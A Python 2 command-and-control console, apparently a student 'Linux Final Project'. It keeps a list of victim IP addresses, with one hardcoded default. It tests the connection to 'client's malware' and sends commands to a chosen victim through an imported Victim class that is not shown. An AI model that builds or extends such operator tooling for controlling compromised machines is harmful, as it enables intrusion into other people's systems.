import sys
import re
from victim import Victim, VictimIsDead


class CNC:

    def __init__(self, options):
        self.options = options
        self.victims = []
        self.d_victims = ['192.168.205.130']
    def print_menu(self):
        """Print the menu options"""
        count = 1
        for option in self.options:
            print "[%d] - %s " % (count, option[0])
            count += 1
        print

    def get_func_from_user(self, input_string):
        """Get input from user and translate it to a function"""
        input = raw_input(input_string)

        # Check that the input is a number
        try:
            choice = int(input)
        except ValueError:
            print "[!] Input is not a number!"
            return None

        # Check that there is such function
        if len(self.options) < choice or choice <= 0:
            print "[!] Input is not in menu range"
            return None

        choice -= 1

        return getattr(self, self.options[choice][1])

    def print_title(self, title):
        """Prints the menu's title"""
        print "[+] " + title + "\n"

    def quit(self):
        """Quit the app"""
        sys.exit()

    def list_victims(self):
        """Prints all of the victims"""
        if len(self.victims) == 0:
            print "[-] No victims added"
            return None

        count = 1
        print '-' * 20
        for victim in self.victims:
            print "[%d] - %s" % (count, victim)
            count += 1
        print '-' * 20

    def default_victims(self):
        if len(self.d_victims) == 0:
            print "[-] No victims added"
            return None

        count = 1
        print '-' * 20
        for victim in self.d_victims:
            print "[%d] - %s" % (count, victim)
            count += 1
        print '-' * 20
        
    def add_victim(self):
        """Add a victim to the program"""
        input = raw_input("Please enter the victim's IP address\n>> ")

        # Check if input is an IP address
        re_check = re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", input)
        if not re_check:
            print "[-] Not a valid IP address"
            return None

        print "[*] Attempt connection to client's malware"

        # Test connection to the malware
        v = Victim(input)
        try:
            v.test_connection("0")
        except VictimIsDead:
            print "[-] %s is dead" % input
            return None

        print "[+] Connection successful"

        # TODO connect to victim to test if malware is installed
        self.victims.append(input)
        print "[+] Client added"

    def control_victim(self):
        """Send controls to the victim"""

        if len(self.victims) == 0:
            print "[-] No victims added"
            return None

        input = raw_input("Please enter the victim's ID\n>> ")

        # Check that the input is a number
        try:
            choice = int(input)
        except ValueError:
            print "[!] Input is not a number!"
            return None

        # Check that there is such function
        if len(self.victims) < choice or choice <= 0:
            print "[!] No such victim!"
            return None

        choice -= 1

        print "[+] Communicating with %s\n" % self.victims[choice]
        v = Victim(self.victims[choice])
        ret = v.communicate()

        # Remove client
        if ret == 'd':
            del self.victims[choice]

def banner():
    print """
    _________        .__                          
    \_   ___ \  ____ |  |   _____ _____    ____   
    /    \  \/ /  _ \|  |  /     \\__  \  /    \  
    \     \___(  <_> )  |_|  Y Y  \/ __ \|   |  \ 
     \______  /\____/|____/__|_|  (____  /___|  / 
            \/                  \/     \/     \/  
               _________    ____   _________      
               \_   ___ \  /  _ \  \_   ___ \     
               /    \  \/  >  _ </\/    \  \/     
               \     \____/  <_\ \/\     \____    
                \______  /\_____\ \ \______  /    
                       \/        \/        \/  v1.1    


                                                  """                                        
                                              
def main():
    """Main function for the CNC client"""

    main_menu_options = [
        ("Add Victim", "add_victim"),
        ("List Victims", "list_victims"),
        ("List default Victim", "default_victims"),
        ("Control Victim", "control_victim"),
        ("Quit", "quit")
    ]

    # Print banner
    banner()
    
    # Display the main menu
    m = CNC(main_menu_options)
    m.print_title("Linux Final Project")
    while True:
        m.print_menu()
        user_chosen_func = m.get_func_from_user(">> ")

        # Execute the chosen function if found
        if user_chosen_func:
            user_chosen_func()

        # Add newline
        print


if __name__ == "__main__":
    main()
